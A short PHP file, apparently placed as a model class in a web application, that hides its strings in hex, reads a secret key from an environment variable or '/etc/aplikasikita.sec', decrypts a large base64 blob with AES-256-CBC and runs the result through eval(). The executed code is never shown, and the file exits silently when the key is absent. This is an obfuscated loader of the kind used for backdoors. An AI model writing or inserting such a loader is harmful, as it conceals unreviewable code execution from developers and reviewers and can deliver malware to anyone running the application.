<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('2L3u/ZfNcVat2jHbbYxrNw==');

$c=base64_decode(

'rametLmaqdaBG68hFYMpbaVmBU6EvcTcP1aoiooz/zeWMth+2pMnw4OjpwNwfi/FiaGV+PWOadU5' .
'o/mflKCtEj8LENiBXu8c0eOHOj3i9kXctZJdFSB68cYfgTBgOIWaFqlTZAQEuYqAVg2pYbUaQiqm' .
'CV3Mja7Ovr2lO2pYfRLP5YTDpGTXDl8R7sulzDYjwzw7PgC/bF3ncDHtMZeg73TAWika4n8BhSx3' .
'Dzcw56giX74Wr+yPFRJO1WxpLGww6HDqt0/QC9DIaGUcSoIsMp2Uo1YMW3nQsFxNLubIT5A1cZ51' .
'ZqPmn40ouFXsHUvuPnbQy84FubgSxrKM/8oLWa7+XyTpqSRnz8irZStCe7Xs8DYF9WMrbsUHu87S' .
'o+xcbh+4GZ00wtIjn/nc5y76+WfaKp5VoyMbFEFj1HAqb2arbfMa5rX/muN/j+DYW6PKavWyFNG4' .
'G8l8fe0H/n9xJLSb6ttgbsm5j0VNvSzj0iEfq3DnfNMX9gh+P8z/48K8glZrEBcRUuNzKnaw6BSQ' .
'uKvTSBHhdOb3NlJBVucv6pCIsqWKOzf8vYSZDY4Ay1bo/Ta0z54PYvVrFQzArPuShVIQ6nOastQe' .
'7i1GVFAljf5DQcq95cvFyDI/a3vQM+KKhRBadhPhfafISRo1QParbJI13CJe2KyIxxWDHrpT6mln' .
'4Y7w6DvUJwyTlJPKv2akUNxWzZA93vYU/Ku8OcGHHUqVKYjhLKMhc37s3avp46FPcK2mW1H3snON' .
'73XzxpAeGLb8xGMjdDZ0LH9bcGeGASGbXRoV2NWcY6TJ8RSbkC8txHikJ9yf4BiRVc5cVszArNrA' .
'EHU2hH9mqP6m3sKvEYZ7fF/Rkghh8+U4iqG9mfif80pX70xxAB+XRrzU5sYqsQrRATBKT6j041hZ' .
'SYRNe2azprXnUJJwq4FuLPzkDFYAokQKoCDxV/ewnjS4g3LkPBI5ac9HGg3WN5vQ+Lz1szk0I+tw' .
'JpK3jjaUkZwB01py48igBn3c8tKlEtTJkx3QW2tIEI98qmI48ZaVu20Pjawf+IwL3CdxGjKgJ0L5' .
'FgsQFWYuhrxxldnEUvoL00+1/B6DutjomhGvZX+t7AzdarQC5g9Oa0PnvE8TArnvoMTP+C4nStxz' .
'G0havPde124itXoGbz9Evrr6MOwehmFVhsJW6iqc92acEXp1hpYrx9YB9J39ia6v+p5Ggu/lVGTz'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

